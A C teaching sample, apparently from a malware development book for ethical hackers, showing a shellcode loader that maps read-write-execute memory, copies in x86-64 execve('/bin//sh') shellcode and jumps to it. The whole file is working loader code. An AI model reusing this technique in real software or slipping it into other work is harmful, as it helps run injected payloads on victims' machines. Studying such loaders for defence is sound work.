/*
 * Malware Development for Ethical Hackers 2nd
 * hack.c
 * shellcode loader using mmap for executable memory allocation
 * author: @cocomelonc
 */
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char code[] = 
  "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48"
  "\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";

int main() {
  // allocate a new page of memory (usually 4KB)
  // we grant it Read, Write, and EXECUTE permissions (PROT_EXEC)
  void *mem = mmap(NULL, sizeof(code), PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (mem == MAP_FAILED) {
    perror("mmap failed");
    return 1;
  }

  // copy the shellcode into the newly allocated executable region
  memcpy(mem, code, sizeof(code));

  // jump to the memory and execute
  printf("memory allocated at %p with PROT_EXEC\n", mem);
  printf("executing shellcode... pwn! =^..^=\n");
  
  ((void (*)())mem)();

  return 0;
}